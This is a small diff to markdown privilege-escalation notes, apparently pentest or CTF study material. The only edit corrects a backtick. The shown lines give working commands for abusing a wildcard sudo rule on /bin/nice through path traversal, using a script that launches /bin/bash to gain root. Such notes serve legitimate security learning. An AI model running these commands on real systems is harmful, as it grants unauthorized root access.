@@ -39,5 +39,5 @@
 - if you find ```(ALL : ALL) /bin/nice /notes/*``` in sudo -l
   - it shows that you can run all the files in the /notes directory with /bin/nice binary.
   - so create a script letsgetroot.sh which executes /bin/bash and gave the necessary permissions.
-  - ```echo "/bin/bash" >> letsgetroot.sh```` save the file in any directory
+  - ```echo "/bin/bash" >> letsgetroot.sh``` save the file in any directory
   - ```sudo /bin/nice /notes/../home/user/letsgetroot.sh``` it will give the root access.
